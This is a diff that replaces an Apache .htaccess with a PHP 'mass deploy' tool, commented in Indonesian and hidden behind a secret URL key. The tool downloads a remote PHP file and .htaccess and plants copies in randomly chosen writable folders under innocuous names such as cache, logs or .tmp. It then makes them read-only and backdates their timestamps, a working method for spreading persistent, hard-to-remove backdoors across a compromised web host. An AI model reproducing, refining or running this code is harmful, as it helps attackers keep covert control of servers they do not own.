@@ -1,19 +1,256 @@
-# ==== Blokir file berbahaya berdasarkan ekstensi dan variasi huruf ====
-<FilesMatch "\.(ph.*|a.*|s.*|P[hH].*|S.*)$">
-    Require all denied
-</FilesMatch>
+<?php
+// Pengaturan error reporting dan optimasi
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+ini_set('memory_limit', '256M'); // Alokasi memori tambahan
+ob_implicit_flush(true); // Aktifkan real-time output
 
-# ==== Pengecualian: hanya izinkan file spesifik ini ====
-<FilesMatch "^index123\.php$">
-    Require all granted
-</FilesMatch>
+// -- PENAMBAHAN PARAMETER KEAMANAN --
+// Kunci rahasia untuk parameter URL
+define('SECRET_KEY', 'Saskra');
 
-# ==== Atur default halaman index ====
-DirectoryIndex index.php
+// Cek apakah parameter kunci ada di URL. Jika tidak, hentikan eksekusi.
+if (!isset($_GET[SECRET_KEY])) {
+    http_response_code(403); // Set status kode ke Forbidden
+    die('<h1>403 Forbidden - Akses Ditolak</h1><p>Tambahkan parameter ?' . SECRET_KEY . ' pada URL untuk mengakses halaman ini.</p>');
+}
+// -- AKHIR PENAMBAHAN --
 
-# ==== Nonaktifkan directory listing ====
-Options -Indexes
+define('SCRIPT_VERSION', '2025-09-27-final-v2'); // Versi dimodifikasi
 
-# ==== Redirect untuk error 403 & 404 ====
-ErrorDocument 403 "<meta http-equiv='refresh' content='0;url=/'>"
-ErrorDocument 404 "<meta http-equiv='refresh' content='0;url=/'>"
+// Fungsi untuk mengambil file dari URL
+function fetchFileFromUrl($url) {
+    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) return false;
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT      => 'Mozilla/5.0',
+        CURLOPT_TIMEOUT        => 10,
+    ]);
+    $data = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
+}
+
+// Fungsi untuk generate nama folder acak
+function generateRandomFolderName($base, $used = []) {
+    $names = ['.tmp', 'cache', 'function', 'logs', 'sess', 'lib', 'assets', 'data'];
+    shuffle($names);
+    foreach ($names as $name) {
+        $folder = $base . '/' . $name;
+        if (!in_array($folder, $used) && !is_dir($folder)) {
+            return $folder;
+        }
+    }
+    return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
+}
+
+// Fungsi untuk mencari semua folder yang bisa ditulisi
+function findAllWritableFolders($dir) {
+    $writableFolders = [];
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        foreach ($iterator as $fileInfo) {
+            if ($fileInfo->isDir() && $fileInfo->isWritable()) {
+                $writableFolders[] = $fileInfo->getPathname();
+            }
+        }
+    } catch (Exception $e) {
+        echo "<div class='error'>❌ Gagal memindai direktori: " . htmlspecialchars($e->getMessage()) . "</div>";
+    }
+    return $writableFolders;
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Mass Deploy ke Leaf Folder V6 By Senyum Gan :)</title>
+    <style>
+        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
+        input, button { padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 10px; background: #222; border: 1px solid #333; color: #0f0; border-radius: 4px; }
+        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
+        button:disabled { background: #444; color: #888; cursor: not-allowed; }
+        .log { background: #0a0a0a; border: 1px solid #333; padding: 15px; margin-top: 20px; border-radius: 5px; min-height: 100px; font-size: 0.9em; line-height: 1.6; word-wrap: break-word; }
+        .success { color: #0f0; }
+        .error { color: #f33; }
+        .info { color: #0af; font-weight: bold; }
+        label { margin-bottom: 5px; display: block; }
+    </style>
+</head>
+<body>
+    <h2>🚀 Mass Deploy .php + .htaccess ke Leaf Folder V6 By Senyum Gan :)</h2>
+    
+    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
+    <form method="POST" action="?<?php echo SECRET_KEY; ?>" onsubmit="document.getElementById('submitBtn').disabled = true; document.getElementById('submitBtn').innerText = '🚀 Memproses...';">
+        <label for="target_path">📁 Target Path:</label>
+        <input type="text" id="target_path" name="target_path" required placeholder="/home/user/public_html">
+
+        <label for="htaccess_url">🌐 URL .htaccess:</label>
+        <input type="text" id="htaccess_url" name="htaccess_url" required placeholder="https://raw.githubusercontent.com/.../.htaccess">
+
+        <label for="php_url">🌐 URL File Target:</label>
+        <input type="text" id="php_url" name="php_url" required placeholder="https://raw.githubusercontent.com/.../file.php">
+
+        <label for="php_name">✍️ Nama File Hasil:</label>
+        <input type="text" id="php_name" name="php_name" placeholder="Otomatis terisi dari URL di atas">
+
+        <label for="folder_limit">🔥 Jumlah Folder Random (1-50):</label>
+        <input type="number" id="folder_limit" name="folder_limit" min="1" max="50" value="5">
+
+        <label for="timestamp">⏰ Timestamp (YYYY-MM-DD HH:MM:SS) (Opsional):</label>
+        <input type="text" id="timestamp" name="timestamp" placeholder="Contoh: 2025-09-22 04:30:00">
+
+        <label for="file_perm">🔐 Izin File (misal: 0444):</label>
+        <input type="text" id="file_perm" name="file_perm" value="0444" placeholder="0444">
+
+        <label for="folder_perm">🔐 Izin Folder (misal: 0555):</label>
+        <input type="text" id="folder_perm" name="folder_perm" value="0555" placeholder="0555">
+        <button type="submit" id="submitBtn">🚀 Deploy Sekarang</button>
+    </form>
+    <?php endif; ?>
+
+    <div class="log">
+    <?php
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        echo "<h3>Memulai Proses Deployment...</h3>";
+
+        // Ambil dan validasi input
+        $target = rtrim(isset($_POST['target_path']) ? $_POST['target_path'] : '', '/');
+        $phpUrl = isset($_POST['php_url']) ? $_POST['php_url'] : '';
+        $htaccessUrl = isset($_POST['htaccess_url']) ? $_POST['htaccess_url'] : '';
+        $phpNameInput = isset($_POST['php_name']) ? $_POST['php_name'] : '';
+        $phpName = !empty($phpNameInput) ? basename($phpNameInput) : basename($phpUrl);
+        $limit = max(1, min(50, intval(isset($_POST['folder_limit']) ? $_POST['folder_limit'] : 5)));
+        $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;
+
+        // ▼▼▼ PENGAMBILAN DAN VALIDASI INPUT CHMOD ▼▼▼
+        $file_perm_input = isset($_POST['file_perm']) ? trim($_POST['file_perm']) : '0444';
+        $folder_perm_input = isset($_POST['folder_perm']) ? trim($_POST['folder_perm']) : '0555';
+
+        // Validasi sederhana: pastikan formatnya octal (e.g., 0755, 755)
+        if (!preg_match('/^[0]?[0-7]{3}$/', $file_perm_input)) { $file_perm_input = '0444'; }
+        if (!preg_match('/^[0]?[0-7]{3}$/', $folder_perm_input)) { $folder_perm_input = '0555'; }
+
+        // Konversi string octal (misal "0444") ke integer octal yang dipahami PHP
+        $file_perm = octdec($file_perm_input);
+        $folder_perm = octdec($folder_perm_input);
+        // ▲▲▲ SELESAI PENGAMBILAN ▲▲▲
+
+        // Validasi awal
+        if (!is_dir($target)) {
+            echo "<div class='error'>❌ Folder target tidak valid: " . htmlspecialchars($target) . "</div>";
+        } elseif (empty($phpName)) {
+            echo "<div class='error'>❌ Nama file hasil tidak boleh kosong. Pastikan URL File Target valid.</div>";
+        } else {
+            // Ambil konten file
+            $phpContent = fetchFileFromUrl($phpUrl);
+            $htaccessContent = fetchFileFromUrl($htaccessUrl);
+
+            if (!$phpContent) echo "<div class='error'>❌ Gagal mengambil konten file dari URL: " . htmlspecialchars($phpUrl) . "</div>";
+            if (!$htaccessContent) echo "<div class='error'>❌ Gagal mengambil konten .htaccess dari URL: " . htmlspecialchars($htaccessUrl) . "</div>";
+
+            // Lanjutkan jika semua konten berhasil diambil
+            if ($phpContent && $htaccessContent) {
+                
+                // Tampilkan info izin yang digunakan
+                echo "<div class='info'>⚙️ Izin File diatur ke: <strong>" . htmlspecialchars($file_perm_input) . "</strong></div>";
+                echo "<div class='info'>⚙️ Izin Folder diatur ke: <strong>" . htmlspecialchars($folder_perm_input) . "</strong></div>";
+
+                echo "<div class='info'>🔍 Mencari folder yang bisa ditulisi...</div>";
+                $allFolders = findAllWritableFolders($target);
+                
+                if (empty($allFolders)) {
+                    echo "<div class='error'>❌ Tidak ditemukan folder yang bisa digunakan untuk deployment.</div>";
+                } else {
+                    echo "<div class='success'>📦 Ditemukan " . count($allFolders) . " folder. Memilih " . $limit . " folder secara acak...</div>";
+                    shuffle($allFolders);
+                    $targets = array_slice($allFolders, 0, $limit);
+                    $usedFolders = [];
+
+                    foreach ($targets as $base) {
+                        $newFolder = generateRandomFolderName($base, $usedFolders);
+                        $usedFolders[] = $newFolder;
+
+                        echo "<div class='info'>↳ Memproses target: " . htmlspecialchars($newFolder) . "</div>";
+
+                        if (!is_dir($newFolder) && !@mkdir($newFolder, 0755, true)) { // 0755 di sini standar untuk mkdir
+                            echo "<div class='error'>❌ Gagal membuat folder: " . htmlspecialchars($newFolder) . "</div>";
+                            continue;
+                        }
+
+                        $phpPath = $newFolder . '/' . $phpName;
+                        $htPath  = $newFolder . '/.htaccess';
+
+                        // Tulis dan amankan file
+                        if (@file_put_contents($phpPath, $phpContent) !== false) {
+                            @chmod($phpPath, $file_perm); // <-- Menggunakan variabel $file_perm
+                            if ($timestamp) @touch($phpPath, $timestamp);
+                            echo "<div class='success'>✅ File dideploy & dikunci (" . htmlspecialchars($file_perm_input) . "): " . htmlspecialchars($phpPath) . "</div>";
+                        } else {
+                            echo "<div class='error'>❌ Gagal menulis file ke: " . htmlspecialchars($phpPath) . "</div>";
+                        }
+
+                        // Tulis dan amankan .htaccess
+                        if (@file_put_contents($htPath, $htaccessContent) !== false) {
+                            @chmod($htPath, $file_perm); // <-- Menggunakan variabel $file_perm
+                            if ($timestamp) @touch($htPath, $timestamp);
+                            echo "<div class='success'>✅ .htaccess dideploy & dikunci (" . htmlspecialchars($file_perm_input) . "): " . htmlspecialchars($htPath) . "</div>";
+                        } else {
+                            echo "<div class='error'>❌ Gagal menulis .htaccess ke: " . htmlspecialchars($htPath) . "</div>";
+                        }
+
+                        // Kunci folder
+                        if (@chmod($newFolder, $folder_perm)) { // <-- Menggunakan variabel $folder_perm
+                             if ($timestamp) @touch($newFolder, $timestamp);
+                             echo "<div class='success'>🔒 Folder diamankan (" . htmlspecialchars($folder_perm_input) . "): " . htmlspecialchars($newFolder) . "</div>";
+                        } else {
+                             echo "<div class='error'>⚠️ Gagal mengamankan folder " . htmlspecialchars($newFolder) . "</div>";
+                        }
+                    }
+                    echo "<h3 style='color:#0f0;'>✅ Semua Proses Selesai.</h3>";
+                }
+            }
+        }
+    }
+    ?>
+    </div>
+    <p style="color:gray;font-size:0.9em; text-align: center; margin-top: 20px;">Versi: <?= SCRIPT_VERSION ?></p>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const urlInput = document.getElementById('php_url');
+            const nameInput = document.getElementById('php_name');
+
+            if (urlInput && nameInput) {
+                urlInput.addEventListener('input', function() {
+                    const urlValue = this.value;
+                    let filename = '';
+                    
+                    try {
+                        // Coba parsing dengan URL constructor jika URL valid
+                        const url = new URL(urlValue);
+                        const pathSegments = url.pathname.split('/').filter(segment => segment);
+                        filename = pathSegments.pop() || '';
+                    } catch (e) {
+                        // Fallback untuk URL yang belum lengkap atau tidak valid saat diketik
+                        const parts = urlValue.split('/');
+                        const lastPart = parts[parts.length - 1] || '';
+                        filename = lastPart.split('?')[0]; // Hapus query string
+                    }
+                    
+                    if (filename) {
+                        nameInput.value = filename;
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
